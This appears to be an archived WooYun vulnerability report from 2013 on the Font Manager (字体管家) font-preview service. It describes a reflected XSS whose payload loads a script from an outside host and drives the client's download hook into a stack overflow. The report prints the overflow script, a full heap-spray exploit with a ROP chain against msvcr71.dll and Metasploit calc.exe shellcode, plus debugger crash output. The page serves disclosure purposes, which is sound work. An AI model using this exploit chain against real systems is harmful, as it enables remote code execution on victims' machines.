@@ -1,0 +1,325 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		字体管家软件内XSS构造恶意连接将永久性造成本地任意代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		字体管家软件内XSS构造恶意连接将永久性造成本地任意代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-06-10 10:52</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-10：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-09-08：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">晚上设计一个小网站的时候用字体管家在线预览字体，手贱测试了一下。构造XSS中的脚本构造恶意下载连接即可永久性造成本地任意代码执行（Win7）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">字体管家是一个字体预览工具，官方网站http://font.xiaa.net，苦逼的前端设计人员可能会用到这玩意儿，字体管家的字体预览处有XSS漏洞，具体为：<br />
+<br />
+http://font.xiaa.net/exe/look.php?str=aaa&amp;size=20&amp;lang=cn<br />
+<br />
+<br />
+<br />
+str处可以构造XSS。网页过滤了&quot;、&#039;，但是方法不正确，网页把&quot;换为了\&quot;，这导致代码还是能直接闭合标签。而且脚本处仍然有很多方法绕过，这个很简单了。<br />
+<br />
+<br />
+<br />
+然后，以下是它的下载脚本，这个脚本由网页调用，然后程序接受事件来处理<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><pre><code>function font_down(fontname, url,vid,o)<br />
+{<br />
+	try{<br />
+		//o.value=&quot;安装中.&quot;;<br />
+		//o.disabled=true;<br />
+		efontname=encodeURIComponent(fontname);<br />
+		window.external.script_download(efontname, url);<br />
+		fontname = fontname.replace(&quot;&#039;&quot;,&quot;\\\&#039;&quot;); //为了不让&#039;造成破坏<br />
+		timerArr[&quot;t&quot;+vid]=window.setTimeout( &quot;af_setup(&#039;&quot;+fontname+&quot;&#039;,&quot;+vid+&quot;)&quot; , 3000 );<br />
+		//alert(efontname+&quot;内部&quot;);<br />
+	}catch(e){<br />
+		alert(&#039;您没有安装字体管家，不能安装字体&#039;);<br />
+		o.disabled=false;<br />
+		o.value=&quot;安装&quot;;<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+调用类似于：<br />
+<br />
+&lt;input type=&#039;button&#039;  value=&#039; 安 装 &#039; onclick=&quot;font_down(&#039;长城新魏碑体&#039;,&#039;http://font.xiaa.net/zip/cn/1.zip&#039;,1,this);&quot; /&gt;<br />
+<br />
+<br />
+<br />
+构造：<br />
+<br />
+http://font.xiaa.net/exe/look.php?str=&quot;&gt;&lt;script src=http://lno.pw/test_4141.js&gt;&lt;/script&gt;&amp;size=20&amp;lang=cn<br />
+<br />
+<br />
+<br />
+进入字体预览－网站在线字库，诱导用户输入查询字符：<br />
+<br />
+&quot;&gt;&lt;script src=http://lno.pw/test_4141.js&gt;&lt;/script&gt;<br />
+<br />
+<br />
+<br />
+输入完的同时脚本加载，调用程序的下载模块，由于字符过长发生栈溢出 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/10000613f3b377a6a7690c84dfc1e12218a89237.jpg" target="_blank"><img src="../images/10000613f3b377a6a7690c84dfc1e12218a89237.jpg" alt="f4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+test_4141.js<br />
+<br />
+</p><pre><code>var x=&quot;A&quot;;<br />
+var i=1; <br />
+for(i=39999;i&gt;0;i--) <br />
+x+=&quot;AAAAAAAAAAAA&quot;; <br />
+font_down(x,x,1,this);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+test.js<br />
+<br />
+</p><pre><code>function padnum(n, numdigits)<br />
+    {<br />
+        n = n.toString();<br />
+        var pnum = &#039;&#039;;<br />
+        if (numdigits &gt; n.length)<br />
+        {<br />
+            for (z = 0; z &lt; (numdigits - n.length); z++)<br />
+            pnum += &#039;0&#039;;<br />
+        }<br />
+        return pnum + n.toString();<br />
+    }<br />
+    var rop, calc, chunk_size, headersize, nopsled, nopsled_len, code;<br />
+    var heap_chunks, i, codewithnum;<br />
+    //        <br />
+    // !mona rop -m msvcr71.dll<br />
+    // * changed from default mona rop chain output<br />
+    //<br />
+    rop = unescape(<br />
+    &quot;%u2e4d%u7c36&quot; +   //  0x7c362e4d, # POP EBP # RETN<br />
+    &quot;%u2e4d%u7c36&quot; +   //  0x7c362e4d, # skip 4 bytes<br />
+    &quot;%uf053%u7c34&quot; +   //  0x7c34f053, # POP EBX # RETN<br />
+    &quot;%u00c8%u0000&quot; +   //  0x000000c8, # 0x000000c8-&gt; ebx (size 200 bytes) *<br />
+    &quot;%u4364%u7c34&quot; +   //  0x7c344364, # POP EDX # RETN<br />
+    &quot;%u0040%u0000&quot; +   //  0x00000040, # 0x00000040-&gt; edx<br />
+    &quot;%uf62d%u7c34&quot; +   //  0x7c34f62d, # POP ECX # RETN<br />
+    &quot;%ue945%u7c38&quot; +   //  0x7c38e945, # &amp;Writable location<br />
+    &quot;%u496e%u7c36&quot; +   //  0x7c36496e, # POP EDI # RETN<br />
+    &quot;%u6c0b%u7c34&quot; +   //  0x7c346c0b, # RETN (ROP NOP)<br />
+    &quot;%u2adb%u7c37&quot; +   //  0x7c372adb, # POP ESI # RETN<br />
+    &quot;%u15a2%u7c34&quot; +   //  0x7c3415a2, # JMP [EAX]<br />
+    &quot;%u4edc%u7c34&quot; +   //  0x7c344edc, # POP EAX # RETN<br />
+    &quot;%ua151%u7c37&quot; +   //  0x7c37a151, # ptr to &amp;VirtualProtect() - 0x0EF  *<br />
+    &quot;%u8c81%u7c37&quot; +   //  0x7c378c81, # PUSHAD # ADD AL,0EF # RETN<br />
+    &quot;%u5c30%u7c34&quot;);   //  0x7c345c30, # ptr to &#039;push esp #  ret &#039;<br />
+    //<br />
+    // ruby msfpayload windows/exec cmd=calc.exe J<br />
+    // windows/exec - 200 bytes<br />
+    // http://www.metasploit.com<br />
+    // VERBOSE=false, EXITFUNC=process, CMD=calc.exe<br />
+    //<br />
+    calc = unescape(<br />
+    &quot;%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30&quot; +<br />
+    &quot;%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031&quot; +<br />
+    &quot;%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752&quot; +<br />
+    &quot;%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a&quot; +<br />
+    &quot;%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34&quot; +<br />
+    &quot;%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475&quot; +<br />
+    &quot;%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66&quot; +<br />
+    &quot;%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424&quot; +<br />
+    &quot;%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86&quot; +<br />
+    &quot;%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff&quot; +<br />
+    &quot;%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c&quot; +<br />
+    &quot;%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5&quot; +<br />
+    &quot;%u6c61%u2e63%u7865%u0065&quot;);<br />
+    //<br />
+    chunk_size = 0x40000;<br />
+    headersize = 0x24;<br />
+    nopsled = unescape(&quot;%u6224%u7c37&quot;); // 0x7c376224 RETN [MSVCR71.dll]<br />
+    nopsled_len = chunk_size - (headersize + rop.length + calc.length);<br />
+    while (nopsled.length &lt; nopsled_len)<br />
+        nopsled += nopsled;<br />
+    nopsled = nopsled.substring(0, nopsled_len);<br />
+    code = nopsled + rop + calc;                             <br />
+    heap_chunks = new Array();<br />
+    for (i = 0 ; i &lt; 1000 ; i++)<br />
+    {<br />
+        codewithnum = padnum(i,4) + code;<br />
+        heap_chunks[i] = codewithnum.substring(0, codewithnum.length);<br />
+    }<br />
+<br />
+<br />
+font_down(heap_chunks[0],heap_chunks[0],1,this);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>0:040&gt; g<br />
+(1eb8.1eb4): C++ EH exception - code e06d7363 (first chance)<br />
+http://????? (1eb8.1eb4): Access violation - code c0000005 (first chance)<br />
+First chance exceptions are reported before any exception handling.<br />
+This exception may be expected and handled.<br />
+eax=05cc0001 ebx=00000000 ecx=41414141 edx=00000437 esi=00458a48 edi=09aee7f1<br />
+eip=41414141 esp=0011806c ebp=0ca5bdf0 iopl=0         nv up ei pl nz na po nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202<br />
+41414141 ??              ???<br />
+0:000&gt; k<br />
+ChildEBP RetAddr  <br />
+WARNING: Frame IP not in any known module. Following frames may be wrong.<br />
+00118068 41414141 0x41414141<br />
+0011806c 41414141 0x41414141<br />
+00118070 41414141 0x41414141<br />
+00118074 41414141 0x41414141<br />
+00118078 41414141 0x41414141<br />
+0011807c 41414141 0x41414141<br />
+00118080 41414141 0x41414141<br />
+00118084 41414141 0x41414141<br />
+00118088 41414141 0x41414141<br />
+0011808c 41414141 0x41414141<br />
+00118090 41414141 0x41414141<br />
+00118094 41414141 0x41414141<br />
+00118098 41414141 0x41414141<br />
+0011809c 41414141 0x41414141<br />
+001180a0 41414141 0x41414141<br />
+001180a4 41414141 0x41414141<br />
+001180a8 41414141 0x41414141</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复XSS，检查下载地址的长度 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-025587" title="字体管家软件内XSS构造恶意连接将永久性造成本地任意代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="25587";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
